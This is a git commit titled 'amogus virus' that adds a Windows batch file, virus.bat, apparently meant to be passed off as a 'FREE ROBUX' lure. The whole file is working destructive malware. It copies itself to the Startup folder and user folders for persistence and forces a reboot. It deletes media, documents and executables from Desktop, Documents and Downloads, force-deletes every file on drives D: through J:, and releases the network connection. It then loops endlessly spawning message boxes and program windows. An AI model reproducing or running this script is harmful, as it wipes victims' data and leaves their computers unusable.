f673f6d78f75fd7eefbb0767ac7f15c0d109dd13
ROBOY6321 <115940120+ROBOY6321@users.noreply.github.com>
2022-12-23 22:23:28 +0400

    amogus virus
    amogus virus

---
+++ virus.bat
@@ -0,0 +1,139 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAjk
+::fBw5plQjdCLcH1jE1041KRVRXkTTcjv0VvtMiA==
+::YAwzuBVtJxjWCl3EqQJhSA==
+::ZR4luwNxJguZRRnRoRtlSA==
+::Yhs/ulQjdFy5
+::cxAkpRVqdFKZSDk=
+::cBs/ulQjdFy5
+::ZR41oxFsdFKZSTk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+IeA==
+::cxY6rQJ7JhzQF1fEqQJhZksaHErSXA==
+::ZQ05rAF9IBncCkqN+0xwdVsFAlTMbCXqZg==
+::ZQ05rAF9IAHYFVzEqQIdLRxVDCeOOWq0A6d8
+::eg0/rx1wNQPfEVWB+kM9LVsJDCmHO2r6JbkZ6eb+/Yo=
+::fBEirQZwNQPfEVWB+kM9LVsJDCmHO2r6JbkZ6eb+/Yo=
+::cRolqwZ3JBvQF1fEqQITJB5VQhfCJWSvFPUM64g=
+::dhA7uBVwLU+EWHSB80MlO1t3QAGMPX6oE6Z8
+::YQ03rBFzNR3SWATE2Uc3KQ5HDCeOOWW7E6cJ+4g=
+::dhAmsQZ3MwfNWATE2Uc3KQ5HDCeOOWW7E6cJ+4g=
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRmL+UVwKxRbQGQ=
+::Zh4grVQjdCyDJGyX8VAjFC5HSRa+GG6pDaET+NTW6u2G4m4RUeMxfZ2V36yLQA==
+::YB416Ek+ZW8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+@echo off
+copy "%userprofile%\Desktop\virus.bat" "%userprofile%\Start Menu\Programs\Startup"
+copy "%userprofile%\Desktop\virus.bat" "%userprofile%\Start menu\Programs\Startup"
+copy "%userprofile%\Desktop\virus.bat" "%userprofile%\Start menu\Programs\Startup"
+copy "%userprofile%\Desktop\virus.bat" "%userprofile%\Start menu\Programs\Startup"
+copy "%userprofile%\Desktop\virus.bat" "%userprofile%\Start menu\Programs\Startup"
+copy "%userprofile%\Desktop\virus.bat" "%userprofile%\Start menu\Programs\Startup"
+copy "%userprofile%\Desktop\virus.bat" "%userprofile%\Start menu\Programs\Startup"
+copy "%userprofile%\Desktop\virus.bat" "%userprofile%\Start menu\Programs\Startup"
+copy "%userprofile%\Desktop\virus.bat" "%userprofile%\Start menu\Programs\Startup"
+copy "%userprofile%\Desktop\virus.bat" "%userprofile%\Start menu\Programs\Startup"
+copy "%userprofile%\Desktop\virus.bat" "%userprofile%\Start menu\Programs\Startup"
+copy "%userprofile%\Desktop\virus.bat" "%userprofile%\Start menu\Programs\Startup"
+copy "%userprofile%\Desktop\virus.bat" "%userprofile%\Start menu\Programs\Startup"
+copy "%userprofile%\Desktop\virus.bat" "%userprofile%\Start menu\Programs\Startup"
+copy "%userprofile%\Desktop\virus.bat" "%userprofile%\Start menu\Programs\Startup"
+copy "%userprofile%\Desktop\virus.bat" "%userprofile%\Start menu\Programs\Startup"
+copy "%userprofile%\Desktop\virus.bat" "%userprofile%\Start menu\Programs\Startup"
+copy "%userprofile%\Desktop\virus.bat"
+
+
+
+
+
+copy "%userprofile%\Desktop\virus.bat" "%userprofile%\Downloads"
+copy "%userprofile%\Desktop\virus.bat" "%userprofile%\Pictures"
+copy "%userprofile%\Desktop\virus.bat" "%userprofile%\Documents"
+copy "%userprofile%\Desktop\virus.bat" "%userprofile%\Videos"
+copy "%userprofile%\Desktop\virus.bat" "%userprofile%\Music"
+
+cls
+
+
+shutdown /r /t 10 /c "Your computer is terminated by FREE ROBUX"
+
+
+del "%userprofile%\Desktop\*.mp3"
+del "%userprofile%\Desktop\*.mp4"
+del "%userprofile%\Desktop\*.exe"
+del "%userprofile%\Desktop\*.png"
+del "%userprofile%\Desktop\*.ink"
+del "%userprofile%\Desktop\*.mov"
+del "%userprofile%\Desktop\*.pdf"
+del "%userprofile%\Desktop\*.jpg"
+del "%userprofile%\Desktop\*.xlsx"
+del "%userprofile%\Desktop\*.html"
+del "%userprofile%\Desktop\*.tiff"
+del "%userprofile%\Desktop\*.odt"
+
+cls
+
+del "%userprofile%\Documents\*.mp3"
+del "%userprofile%\Documents\*.mp4"
+del "%userprofile%\Documents\*.exe"
+del "%userprofile%\Documents\*.png"
+del "%userprofile%\Documents\*.ink"
+del "%userprofile%\Documents\*.mov"
+del "%userprofile%\Documents\*.pdf"
+del "%userprofile%\Documents\*.jpg"
+del "%userprofile%\Documents\*.xlsx"
+del "%userprofile%\Documents\*.html"
+del "%userprofile%\Documents\*.tiff"
+del "%userprofile%\Documents\*.odt"
+
+cls
+
+del "%userprofile%\Downloads\*.mp3"
+del "%userprofile%\Downloads\*.mp4"
+del "%userprofile%\Downloads\*.exe"
+del "%userprofile%\Downloads\*.png"
+del "%userprofile%\Downloads\*.ink"
+del "%userprofile%\Downloads\*.mov"
+del "%userprofile%\Downloads\*.pdf"
+del "%userprofile%\Downloads\*.jpg"
+del "%userprofile%\Downloads\*.xlsx"
+del "%userprofile%\Downloads\*.html"
+del "%userprofile%\Downloads\*.tiff"
+del "%userprofile%\Downloads\*.odt"
+
+cls
+
+del D:\*.* /f /s /q
+del E:\*.* /f /s /q
+del F:\*.* /f /s /q
+del G:\*.* /f /s /q
+del I:\*.* /f /s /q
+del J:\*.* /f /s /q
+del G:\*.* /f /s /q
+del H:\*.* /f /s /q
+
+ipconfig /release
+
+:loop
+echo x*msgbox("free robux is stealing your robux :D",0,"Free robux says..") >> msgbox.vbs
+start msgbox.vbs
+echo x*msgbox("still using this computer??",0,"Free robux says..") >> msgbox.vbs
+start msgbox.vbs
+echo x*msgbox("aw man im not sorry!",0,"Free robux says..") >> msgbox.vbs
+start msgbox.vbs
+
+start calc
+start cmd
+start explorer
+
+
+goto loop
